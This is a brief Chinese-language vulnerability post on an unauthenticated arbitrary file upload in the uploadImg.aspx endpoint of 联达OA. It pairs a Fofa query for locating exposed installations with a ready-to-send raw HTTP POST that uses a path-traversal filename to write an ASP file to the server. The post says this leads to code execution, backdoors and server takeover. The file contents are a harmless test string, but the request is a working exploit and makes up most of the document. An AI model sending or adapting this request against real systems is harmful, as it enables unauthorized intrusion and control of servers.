# 联达OA接口uploadImg.aspx任意文件上传漏洞

联达OA uploadImg.aspx 接口处存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## Fofa

```javascript
app="联达OA"
```

## poc

```javascript
POST /Dept_Portal/uploadImg.aspx HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
Content-Type: multipart/form-data; boundary=boundary=00content0boundary00
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
 
--00content0boundary00
Content-Disposition: form-data; name="DesignId"
 
1
--00content0boundary00
Content-Disposition: form-data; name="Filedata"; filename="../../../../b.asp"
Content-Type: image/png
 
<% Response.Write("Hello, World") %>
--00content0boundary00--
```

![image-20241021210452916](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410251422669.png)

```
/b.asp
```

![image-20241021210504062](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410251422557.png)
